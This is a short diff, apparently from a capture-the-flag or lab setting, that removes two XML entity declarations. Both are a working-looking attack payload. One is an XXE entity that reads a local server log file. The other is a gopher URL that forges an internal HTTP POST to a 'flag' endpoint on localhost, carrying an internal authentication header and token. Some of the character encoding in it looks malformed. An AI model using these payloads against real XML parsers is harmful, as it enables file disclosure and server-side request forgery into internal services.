@@ -1,2 +1,0 @@
-<!ENTITY xxe SYSTEM "file:///proc/self/cwd/data/debug.log">
-<!ENTITY logfile "gopher://127.0.0.1:7777/_POST&#3720/internal/referral-debug/flag&#3720HTTP/1.1&#370D&#370AHost:&#3720127.0.0.1&#370D&#370Ax-ntnx-internal-auth:&#3720e47527fc-b91b-46a1-8ce3-54a918c6afbe&#370D&#370A&#370D&#370A">
